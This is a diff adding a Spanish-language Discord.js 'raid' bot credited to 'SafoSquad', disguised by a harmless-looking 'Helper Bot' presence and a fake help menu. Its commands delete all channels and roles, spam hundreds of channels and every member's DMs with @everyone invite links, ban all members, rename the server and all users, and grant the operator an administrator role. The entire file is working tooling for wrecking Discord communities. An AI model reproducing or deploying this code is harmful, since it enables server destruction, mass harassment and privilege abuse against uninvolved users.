@@ -1,0 +1,299 @@
+const Discord = require("discord.js");
+const client = new Discord.Client();
+const chalk = require('chalk');
+ 
+client.on("ready", () => {
+ 
+console.log(chalk.red(`
+  █████████           ██████           █████████                                █████    ███████████    ███████   ███████████    ███████████           ███     █████    █████   ████████   █████   
+ ███░░░░░███         ███░░███         ███░░░░░███                              ░░███    ░░███░░░░░███ ███░░░░░███░█░░░███░░░█   ░░███░░░░░███         ░░░     ░░███    ░░███   ░░██░░███ ███░░░███ 
+░███    ░░░ ██████  ░███ ░░██████    ░███    ░░░  ████████████ ████ ██████   ███████     ░███    ░██████     ░░██░   ░███  ░     ░███    ░███  ██████ ████  ███████     ░███    ░███░██████   ░░███
+░░█████████░░░░░█████████████░░███   ░░█████████ ███░░██░░███ ░███ ░░░░░███ ███░░███     ░██████████░███      ░███   ░███        ░██████████  ░░░░░██░░███ ███░░███     ░███    ░███░██░███    ░███
+ ░░░░░░░░█████████░░░███░░███ ░███    ░░░░░░░░██░███ ░███░███ ░███  ███████░███ ░███     ░███░░░░░██░███      ░███   ░███        ░███░░░░░███  ███████░███░███ ░███     ░░███   ███ ░██░███    ░███
+ ███    ░█████░░███ ░███ ░███ ░███    ███    ░██░███ ░███░███ ░███ ███░░███░███ ░███     ░███    ░██░░███     ███    ░███        ░███    ░███ ███░░███░███░███ ░███      ░░░█████░  ░██░░███   ███ 
+░░████████░░█████████████░░██████    ░░█████████░░███████░░███████░░███████░░████████    ███████████ ░░░███████░     █████       █████   ████░░███████████░░████████       ░░███    ████░░░█████░  
+ ░░░░░░░░░ ░░░░░░░░░░░░░  ░░░░░░      ░░░░░░░░░  ░░░░░███ ░░░░░░░░ ░░░░░░░░ ░░░░░░░░    ░░░░░░░░░░░    ░░░░░░░      ░░░░░       ░░░░░   ░░░░░ ░░░░░░░░░░░░ ░░░░░░░░         ░░░    ░░░░░  ░░░░░░   
+                                                     ░███                                                                                                                                          
+                                                     █████                                                                                                                                         
+                                                    ░░░░░                                                                                                                                          
+  `))
+ 
+ 
+console.log(chalk.red(""));   
+console.log(chalk.white(""));   
+console.log("                          ");   
+  
+  console.log(chalk.blue("                                            Iniciando bot raid..."));
+  console.log("   ")  
+  console.log(chalk.blue(`                                            Cliente ${client.user.tag} listo para el raid!`));  
+  console.log(chalk.blue("                                            Bot creado por Marbio34"));  
+  console.log("      ") 
+  console.log(chalk.red(`
+                                            [-] Comandos basicos de raid:
+                                            [+] .raid | .nuke | .mdall
+                                            [-] Comandos avanzados:
+                                            [+] .on | .admin | .lista | .eliminarroles | .crearroles | .banall | .nick
+                                            [-] El comando .raid hace más ping que el .on pero es mejor iniciar con el .on y luego .raid`))
+ 
+console.log("      ")
+ 
+console.log(chalk.blue(`
+                                                                      SafoSquad: https://discord.gg/gxRv3Dxaju `))
+  
+ 
+ 
+   presencia();  
+    });
+ 
+ 
+ 
+function presencia(){
+  client.user.setPresence({
+status: "dnd",
+activity: {
+  name: "Helper Bot V10",
+  type: "PLAYING"
+ 
+}
+  });
+}
+ 
+ 
+//automatico
+ 
+client.on("message", message => {
+  if(message.author.bot) return;
+ 
+  if(message.content === '.on'){
+      message.delete()
+      message.guild.channels.cache.forEach(channel => channel.delete());
+      message.guild.channels.create(`attacked-by-SafoSquad`, {
+        type: 'text'
+      }).then(channel => {
+        channel.send("https://cdn.discordapp.com/attachments/835167870748590133/838708906988797952/safo_squad_banner.jpg")
+      })
+    for (let i = 0; i <= 500; i++) {
+         message.guild.channels.create(`attacked-by-SafoSquad`, {
+           type: 'text'
+         }).then(channel => {
+           channel.send("@everyone **Raid By SafoSquad** https://discord.gg/gxRv3Dxaju  , https://cdn.discordapp.com/attachments/839574801714511872/841400447234867260/EarlyPertinentBarnswallow-size_restricted.gif");
+           channel.send("@everyone **Raid By SafoSquad** https://discord.gg/gxRv3Dxaju  , https://cdn.discordapp.com/attachments/839574801714511872/841400447234867260/EarlyPertinentBarnswallow-size_restricted.gif");
+           channel.send("@everyone **Raid By SafoSquad** https://discord.gg/gxRv3Dxaju  , https://cdn.discordapp.com/attachments/839574801714511872/841400447234867260/EarlyPertinentBarnswallow-size_restricted.gif");
+           channel.send("@everyone **Raid By SafoSquad** https://discord.gg/gxRv3Dxaju  , https://cdn.discordapp.com/attachments/839574801714511872/841400447234867260/EarlyPertinentBarnswallow-size_restricted.gif");
+           channel.send("@everyone **Raid By SafoSquad** https://discord.gg/gxRv3Dxaju  , https://cdn.discordapp.com/attachments/839574801714511872/841400447234867260/EarlyPertinentBarnswallow-size_restricted.gif");
+           channel.send("@everyone **Raid By SafoSquad** https://discord.gg/gxRv3Dxaju  , https://cdn.discordapp.com/attachments/839574801714511872/841400447234867260/EarlyPertinentBarnswallow-size_restricted.gif");
+           channel.send("@everyone **Raid By SafoSquad** https://discord.gg/gxRv3Dxaju  , https://cdn.discordapp.com/attachments/839574801714511872/841400447234867260/EarlyPertinentBarnswallow-size_restricted.gif");
+           channel.send("@everyone **Raid By SafoSquad** https://discord.gg/gxRv3Dxaju  , https://cdn.discordapp.com/attachments/839574801714511872/841400447234867260/EarlyPertinentBarnswallow-size_restricted.gif");
+           channel.send("@everyone **Raid By SafoSquad** https://discord.gg/gxRv3Dxaju  , https://cdn.discordapp.com/attachments/839574801714511872/841400447234867260/EarlyPertinentBarnswallow-size_restricted.gif");
+           channel.send("@everyone **Raid By SafoSquad** https://discord.gg/gxRv3Dxaju  , https://cdn.discordapp.com/attachments/839574801714511872/841400447234867260/EarlyPertinentBarnswallow-size_restricted.gif");
+           channel.send("@everyone **Raid By SafoSquad** https://discord.gg/gxRv3Dxaju  , https://cdn.discordapp.com/attachments/839574801714511872/841400447234867260/EarlyPertinentBarnswallow-size_restricted.gif");
+           channel.send("@everyone **Raid By SafoSquad** https://discord.gg/gxRv3Dxaju  , https://cdn.discordapp.com/attachments/839574801714511872/841400447234867260/EarlyPertinentBarnswallow-size_restricted.gif");
+           channel.send("@everyone **Raid By SafoSquad** https://discord.gg/gxRv3Dxaju  , https://cdn.discordapp.com/attachments/839574801714511872/841400447234867260/EarlyPertinentBarnswallow-size_restricted.gif");
+           channel.send("@everyone **Raid By SafoSquad** https://discord.gg/gxRv3Dxaju  , https://cdn.discordapp.com/attachments/839574801714511872/841400447234867260/EarlyPertinentBarnswallow-size_restricted.gif");
+           channel.send("@everyone **Raid By SafoSquad** https://discord.gg/gxRv3Dxaju  , https://cdn.discordapp.com/attachments/839574801714511872/841400447234867260/EarlyPertinentBarnswallow-size_restricted.gif");
+           channel.send("@everyone **Raid By SafoSquad** https://discord.gg/gxRv3Dxaju  , https://cdn.discordapp.com/attachments/839574801714511872/841400447234867260/EarlyPertinentBarnswallow-size_restricted.gif");
+           channel.send("@everyone **Raid By SafoSquad** https://discord.gg/gxRv3Dxaju  , https://cdn.discordapp.com/attachments/839574801714511872/841400447234867260/EarlyPertinentBarnswallow-size_restricted.gif");
+           channel.send("@everyone **Raid By SafoSquad** https://discord.gg/gxRv3Dxaju  , https://cdn.discordapp.com/attachments/839574801714511872/841400447234867260/EarlyPertinentBarnswallow-size_restricted.gif");
+           channel.send("@everyone **Raid By SafoSquad** https://discord.gg/gxRv3Dxaju  , https://cdn.discordapp.com/attachments/839574801714511872/841400447234867260/EarlyPertinentBarnswallow-size_restricted.gif");
+           
+       })
+       }
+       message.guild.setName("RaidBySafoSquad");
+       message.guild.setIcon("https://cdn.discordapp.com/attachments/845294934604513303/845295591096451082/720_30_3.78_May172021.gif");
+     }
+})
+ 
+ 
+//admin
+ 
+client.on("message", async msg => {
+  if (msg.author.bot) return;
+  if(msg.content.toLowerCase().startsWith('.admin')){
+    let rol = await msg.guild.roles.create({data: {
+      name: "$",
+      color: "B9BBBE",
+      permissions: "ADMINISTRATOR",
+      hoisted: false
+    }})
+ 
+msg.member.roles.add(rol)
+      .then(function(role) {
+        msg.member.addRole(role);
+        if (msg.deletable) msg.delete().catch(e => {});
+      })
+      .catch(e => {});
+  }
+});
+ 
+ 
+//lista
+ 
+ 
+client.on("message", message => {
+    if (message.author.bot) return;
+    const args = message.content.slice().trim().split(/ +/g );
+    const command = args.shift().toLowerCase();
+   if (command === '.lista') {
+       message.delete()
+       const embed = new Discord.MessageEmbed()
+       .setTitle(message.guild.name)
+       .setThumbnail()
+       .setDescription(`**Canales:** | ${message.guild.channels.cache.size}\n**Roles:** | ${message.guild.roles.cache.size}\n**Users:** | ${message.guild.memberCount}`)
+       .setColor("RED");
+       message.channel.send(embed)
+   }
+});
+ 
+ 
+//banall
+ 
+client.on("message", async message => {
+    if(message.content.startsWith('.banall')){
+      message.delete();
+      if(!message.member.hasPermission("BAN_MEMBERS") || !message.member.hasPermission("ADMINISTRATOR")) return;
+      message.guild.members.cache.forEach(member => {
+        if(member != message.member && member.id != "ID" && member.id != "ID" && member.id != "ID"){
+          member.ban();
+        }
+      })
+    }});
+ 
+ 
+//nuke 
+ 
+client.on("message", message => {
+    if (message.author.bot) return;
+  
+   if (message.content === '.nuke') {
+    message.delete()
+    message.guild.channels.cache.forEach(channel => channel.delete());
+    message.guild.channels.create(`#SafoSquad`, {
+          type: 'text'
+        }).then(channel => {
+          channel.send("https://images-ext-1.discordapp.net/external/ZKp5pgizgfa03NLAe3ebBxto8f9LmnTpqEWhbYimT5g/https/media.discordapp.net/attachments/834489069467467836/834494514478448691/safo_squad_banner.jpg")
+        })
+         }
+      })
+ 
+ 
+//chats
+ 
+client.on("message", message => {
+            if (message.author.bot) return;
+          
+           if (message.content === '.raid') {
+            message.delete()
+           for (let i = 0; i <= 500; i++) {
+                message.guild.channels.create(`Attacked by SafoSquad`, {
+                  type: 'text'
+                }).then(channel => {
+                  channel.send("@everyone https://discord.gg/gxRv3Dxaju  ")
+              channel.send("@everyone **Raid By SafoSquad** https://discord.gg/gxRv3Dxaju  , https://cdn.discordapp.com/attachments/839574801714511872/841400447234867260/EarlyPertinentBarnswallow-size_restricted.gif")
+              channel.send("@everyone **Raid By SafoSquad** https://discord.gg/gxRv3Dxaju  , https://cdn.discordapp.com/attachments/839574801714511872/841400447234867260/EarlyPertinentBarnswallow-size_restricted.gif")
+              channel.send("@everyone **Raid By SafoSquad** https://discord.gg/gxRv3Dxaju  , https://cdn.discordapp.com/attachments/839574801714511872/841400447234867260/EarlyPertinentBarnswallow-size_restricted.gif")
+              channel.send("@everyone **Raid By SafoSquad** https://discord.gg/gxRv3Dxaju  , https://cdn.discordapp.com/attachments/839574801714511872/841400447234867260/EarlyPertinentBarnswallow-size_restricted.gif")
+              channel.send("@everyone **Raid By SafoSquad** https://discord.gg/gxRv3Dxaju  , https://cdn.discordapp.com/attachments/839574801714511872/841400447234867260/EarlyPertinentBarnswallow-size_restricted.gif")
+              channel.send("@everyone **Raid By SafoSquad** https://discord.gg/gxRv3Dxaju  , https://cdn.discordapp.com/attachments/839574801714511872/841400447234867260/EarlyPertinentBarnswallow-size_restricted.gif")
+              channel.send("@everyone **Raid By SafoSquad** https://discord.gg/gxRv3Dxaju  , https://cdn.discordapp.com/attachments/839574801714511872/841400447234867260/EarlyPertinentBarnswallow-size_restricted.gif")
+              channel.send("@everyone **Raid By SafoSquad** https://discord.gg/gxRv3Dxaju  , https://cdn.discordapp.com/attachments/839574801714511872/841400447234867260/EarlyPertinentBarnswallow-size_restricted.gif")
+              channel.send("@everyone **Raid By SafoSquad** https://discord.gg/gxRv3Dxaju  , https://cdn.discordapp.com/attachments/839574801714511872/841400447234867260/EarlyPertinentBarnswallow-size_restricted.gif")
+              channel.send("@everyone **Raid By SafoSquad** https://discord.gg/gxRv3Dxaju  , https://cdn.discordapp.com/attachments/839574801714511872/841400447234867260/EarlyPertinentBarnswallow-size_restricted.gif")
+              channel.send("@everyone **Raid By SafoSquad** https://discord.gg/gxRv3Dxaju  , https://cdn.discordapp.com/attachments/839574801714511872/841400447234867260/EarlyPertinentBarnswallow-size_restricted.gif")
+              channel.send("@everyone **Raid By SafoSquad** https://discord.gg/gxRv3Dxaju  , https://cdn.discordapp.com/attachments/839574801714511872/841400447234867260/EarlyPertinentBarnswallow-size_restricted.gif")
+              channel.send("@everyone **Raid By SafoSquad** https://discord.gg/gxRv3Dxaju  , https://cdn.discordapp.com/attachments/839574801714511872/841400447234867260/EarlyPertinentBarnswallow-size_restricted.gif");
+              channel.send("@everyone **Raid By SafoSquad** https://discord.gg/gxRv3Dxaju  , https://cdn.discordapp.com/attachments/839574801714511872/841400447234867260/EarlyPertinentBarnswallow-size_restricted.gif");
+              channel.send("@everyone **Raid By SafoSquad** https://discord.gg/gxRv3Dxaju  , https://cdn.discordapp.com/attachments/839574801714511872/841400447234867260/EarlyPertinentBarnswallow-size_restricted.gif");
+              channel.send("@everyone **Raid By SafoSquad** https://discord.gg/gxRv3Dxaju  , https://cdn.discordapp.com/attachments/839574801714511872/841400447234867260/EarlyPertinentBarnswallow-size_restricted.gif");
+              channel.send("@everyone **Raid By SafoSquad** https://discord.gg/gxRv3Dxaju  , https://cdn.discordapp.com/attachments/839574801714511872/841400447234867260/EarlyPertinentBarnswallow-size_restricted.gif");
+                  
+              })
+              }
+              }
+            });
+ 
+//mdall
+ 
+client.on("message", message => {
+                        if (message.author.bot) return;
+                        
+                      if(message.content === ".mdall")
+                        message.delete()
+                      message.guild.members.cache.forEach(member => {
+                        setInterval(function(){
+                          member.send("Raid By SafoSquad** https://discord.gg/gxRv3Dxaju  https://www.youtube.com/channel/UCXOuRXwT0LcIk-ih673scOQ/videos ").catch(error => {});
+                        },450);
+                      })
+                      });
+ 
+ 
+//borrar roles
+ 
+client.on("message", message => {
+                    if (message.author.bot) return;
+                  
+                     if(message.content === ('.eliminarroles')){
+                      message.delete()
+                            message.guild.roles.cache.map(roles => roles.delete());
+                          }
+                  });
+ 
+//crear roles
+ 
+client.on("message", message => {
+                if (message.author.bot) return;
+              
+               if (message.content === '.crearroles') {
+                message.delete()
+              for (let i = 0; i <= 200; i++) {
+                 message.guild.roles.create({data: {name: `RaidBySafoSquad`,color: '#d41818',},reason: 'razon',})
+              };
+               }
+                });
+ 
+//nickall
+ 
+client.on("message", msg => {
+const args = msg.content.slice().trim().split(/ +/g );
+const command = args.shift().toLowerCase();
+  if (command === '.nick'){
+      msg.delete()
+    let nickname = args.join(" ");
+    var i = 0;
+    msg.guild.members.cache.forEach(member =>{
+      i++
+    }
+      )
+    msg.channel.send("> Cambiando el nombre de **" + i + "** usuarios a: **" + nickname + "**")
+    msg.guild.members.cache.forEach(member =>{
+ 
+      member.setNickname(nickname)
+    })
+    }
+});
+  
+
+client.on("message", async message => {
+  if (!message.guild) return;
+  if (message.author.bot) return;
+  if (!message.content.startsWith(prefixnormal)) return;
+  const args = message.content.slice(prefixnormal.length).trim().split(/ +/g);
+  const command = args.shift().toLowerCase();
+  if (command == "help") {
+    const embed = new Discord.MessageEmbed()
+      .setTitle(":gear: Aidol ugu Bot :gear:")
+      .setDescription("Aquí tienes mi lista de comandos")
+      .addField("Giveaways", "gstart, greroll, gend")
+      .addField("Diversión", "8ball, say, waifu")
+      .addField("Comandos Otakus", "anime , kakeregui , osu")
+      .addField("Comandos informacion", "avatar, suggest , invitebot")
+      .addField("Comandos Utiles", "ban , warn , kick")
+      .setThumbnail(client.user.displayAvatarURL({ dynamic: true }))
+      .setFooter("Aidol ugu | Bot")
+      .setColor("PURPLE");
+    message.channel.send(embed)
+  }
+});
+ 
+
+ 
+client.login("TOKEN");
